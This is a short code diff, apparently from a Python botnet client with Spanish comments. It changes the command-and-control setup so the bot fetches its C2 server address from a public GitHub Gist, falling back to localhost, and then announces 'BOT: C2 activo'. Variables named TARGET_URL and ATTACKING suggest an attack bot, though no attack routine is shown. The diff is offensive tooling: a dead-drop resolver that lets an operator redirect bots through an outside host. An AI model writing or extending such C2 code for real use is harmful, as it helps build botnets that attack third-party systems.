@@ -26,12 +26,24 @@ except ImportError:
 #                           CONFIGURACION C2
 # =====================================================================
 
-GIST_URL = "https://gist.githubusercontent.com/AlejandroG-code/a009a491429503b9388e38468bddf77c/raw/c2_config.txt"
+GIST_URL = "https://gist.githubusercontent.com/AlejandroG-code/a009a491429503b9388e38468bddf77c/raw/bc9f874924493b12072b295c9dd6ba9bd37c6a9d/c2_config.txt"
 TARGET_URL = None
 ATTACKING = False
 
 def _get_c2_url():
-    return "http://127.0.0.1:3000"
+    """Obtiene la URL del C2 desde el Gist o usa el fallback local."""
+    local_fallback = "http://127.0.0.1:3000"
+    try:
+        with urllib.request.urlopen(GIST_URL, timeout=5) as resp:
+            gist_content = resp.read().decode('utf-8').strip()
+            if gist_content:
+                # Si el contenido no tiene protocolo, se lo añadimos
+                if not gist_content.startswith("http"):
+                    return f"http://{gist_content}"
+                return gist_content
+    except Exception as e:
+        pass
+    return local_fallback
 
 C2_URL = _get_c2_url()
 print(f"[!] BOT: C2 activo en {C2_URL}")
